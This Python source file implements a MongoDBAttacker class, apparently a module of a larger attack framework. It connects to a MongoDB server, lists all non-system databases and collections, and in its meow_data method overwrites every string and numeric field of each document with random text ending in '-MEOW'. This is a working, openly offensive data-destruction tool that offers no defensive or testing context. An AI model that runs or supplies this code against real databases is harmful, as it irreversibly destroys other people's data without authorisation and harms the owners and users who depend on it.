import random
import string
from pymongo import MongoClient
from core.base_attacker import BaseAttacker

class MongoDBAttacker(BaseAttacker):
    """
    MongoDB implementation of the BaseAttacker.
    """
    
    @classmethod
    def get_service_name(cls):
        return "mongodb"
    
    @classmethod
    def get_default_port(cls):
        return 27017
    
    def connect(self):
        """
        Connect to MongoDB server.
        """
        connection_string = "mongodb://"
        
        # Add authentication if provided
        if self.username and self.password:
            connection_string += f"{self.username}:{self.password}@"
            
        connection_string += f"{self.host}:{self.port}/"
        
        try:
            self.client = MongoClient(connection_string, serverSelectionTimeoutMS=5000)
            # Verify connection
            self.client.admin.command('ping')
            self.logger.info("Successfully connected to MongoDB")
            return self.client
        except Exception as e:
            self.logger.error(f"Failed to connect to MongoDB: {str(e)}")
            raise
    
    def get_databases(self):
        """
        Get list of databases, excluding system databases.
        """
        databases = self.client.list_database_names()
        # Filter out system databases
        return [db for db in databases if db not in ('admin', 'local', 'config')]
    
    def get_collections(self, database):
        """
        Get list of collections for the specified database.
        """
        db = self.client[database]
        return db.list_collection_names()
    
    def random_alphanumeric(self, length=10):
        """
        Generate a random alphanumeric string.
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def meow_data(self, database, collection):
        """
        Execute the MEOW attack on the specified collection.
        """
        db = self.client[database]
        collection_obj = db[collection]
        total_docs = collection_obj.count_documents({})
        modified_count = 0
        
        for doc in collection_obj.find():
            updated_doc = {}
            for key, value in doc.items():
                if key == '_id':
                    continue  # Don't modify the _id field
                    
                if isinstance(value, (str, int, float)):
                    random_chars = self.random_alphanumeric()
                    new_value = f"{random_chars}-MEOW"
                    updated_doc[key] = new_value
                else:
                    updated_doc[key] = value
                    
            result = collection_obj.update_one({'_id': doc['_id']}, {'$set': updated_doc})
            modified_count += result.modified_count
        
        self.logger.info(f"Modified {modified_count} documents in {database}.{collection}")
        return modified_count
    
    def close(self):
        """
        Close the MongoDB connection.
        """
        if hasattr(self, 'client'):
            self.client.close()
            self.logger.info("MongoDB connection closed")